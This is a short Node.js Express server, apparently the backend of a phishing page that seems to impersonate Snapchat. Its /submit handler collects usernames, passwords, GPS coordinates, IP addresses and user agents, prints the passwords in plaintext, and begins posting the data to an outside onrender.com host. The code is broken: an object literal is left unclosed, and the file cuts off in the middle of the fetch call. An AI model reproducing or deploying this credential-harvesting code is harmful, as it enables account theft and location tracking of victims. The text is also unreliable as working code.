const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/submit', async (req, res) => {
  try {
    const { username, password, latitude, longitude } = req.body;

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      password,
    console.log("👤 Benutzername:", username);
    console.log("🔑 Passwort:", password);
    console.log("📍 Standort:", latitude, longitude);
    console.log("📍 IP:", clientIp);

    await fetch('https://snapchat-usvu.onrender.com/submit', {
      method: 'POST',
